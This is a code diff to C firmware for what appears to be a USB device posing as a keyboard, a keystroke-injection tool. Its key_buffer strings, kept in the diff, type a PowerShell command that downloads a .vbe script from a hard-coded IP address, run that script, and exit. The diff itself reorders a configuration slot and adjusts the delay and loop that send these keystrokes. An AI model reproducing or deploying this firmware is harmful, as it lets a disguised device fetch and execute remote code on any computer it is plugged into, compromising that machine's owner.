@@ -28,12 +28,18 @@ typedef unsigned short uint16_t;
 #define readl(addr)         (*( ( volatile uint32_t * )(addr)) )
 #define writel(addr, data)  (*( ( volatile uint32_t * )(addr)) = data)
 
+struct system_config
+{
+	uint32_t magic_num;
+	uint32_t delay_count;
+};
+
 char *key_buffer[4] = {
+	/* this memory use as system config */
+	"\xef\xbe\xad\xde\x40\x42\x0F\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
 	"powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n\0\0\0\0\0\0\0\0\0\0\0\0",
 	"D:\\test.vbe\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
 	"exit\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
-	/* this memory use as system config */
-	"\x40\x42\x0F\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
 };
 
 u8 Buffer_Shift[8]   = {0x2, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Shift
@@ -313,12 +319,14 @@ void delay(uint32_t t)
 
 void __keyboard_send(u8 *Buffer)
 {
-		uint32_t delay_count = readl(key_buffer[3]);
+		struct system_config *sc = (struct system_config *)(key_buffer[0]);
+		//printf("%d %d"), sc->delay_count;
+		//return;
 		/*copy mouse position info in ENDP1 Tx Packet Memory Area*/
 		UserToPMABufferCopy(Buffer, GetEPTxAddr(ENDP1), 8);
 		/* enable endpoint for transmission */
 		SetEPTxValid(ENDP1);
-		Delay(1000000);
+		Delay(sc->delay_count);
 }
 
 int keyboard_send_ascii(u8 c)
@@ -493,7 +501,7 @@ int main(void)
 		__keyboard_send(buffer_release);
 		/****************************************************/
 		
-		for(i = 0; i < 3; i++) {
+		for(i = 1; i < 4; i++) {
 			if (strlen(key_buffer[i]) != 0) {
 				keyboard_send_string(key_buffer[i]);
 			}
